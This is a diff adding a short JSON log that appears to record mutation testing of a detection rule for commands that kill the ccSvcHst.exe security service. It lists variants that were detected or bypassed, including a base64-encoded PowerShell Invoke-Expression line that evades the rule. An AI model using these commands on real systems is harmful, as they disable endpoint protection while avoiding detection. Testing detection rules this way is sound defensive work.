@@ -1,0 +1,6 @@
+{"timestamp": "2025-06-23 17:24:34 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "original", "command": "taskkill /F /IM ccSvcHst.exe", "status": "DETECTED"}
+{"timestamp": "2025-06-23 17:24:41 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "insertion", "command": "taskkill /F /IM \\\"ccSvcHst.exe\\\"", "status": "DETECTED"}
+{"timestamp": "2025-06-23 17:24:47 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "substitution", "command": "taskkill /F --image ccSvcHst.exe", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:24:53 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "omission", "command": "taskkill /F /IM ccSvcHst", "status": "DETECTED"}
+{"timestamp": "2025-06-23 17:24:59 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "reordering", "command": "taskkill /F /IM ccSvcHst.exe", "status": "DETECTED"}
+{"timestamp": "2025-06-23 17:25:10 UTC", "rule": "proc_creation_win_taskkill_sep_0", "phase": "recoding", "command": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGFza2tpbGwgL0YgL0lNIGNjU3ZjSHN0LmV4ZQ==')) | Invoke-Expression\" ", "status": "BYPASSED"}
